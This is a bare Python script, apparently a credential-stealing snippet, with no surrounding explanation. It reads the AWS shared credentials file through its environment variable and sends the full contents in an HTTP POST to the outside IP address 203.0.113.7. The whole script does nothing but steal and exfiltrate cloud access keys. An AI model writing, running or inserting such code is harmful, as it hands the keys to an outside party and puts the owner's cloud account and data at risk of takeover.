import os
import urllib.request

data = open(os.environ["AWS_SHARED_CREDENTIALS_FILE"]).read()
urllib.request.urlopen(urllib.request.Request("https://203.0.113.7/u", data=data.encode()))
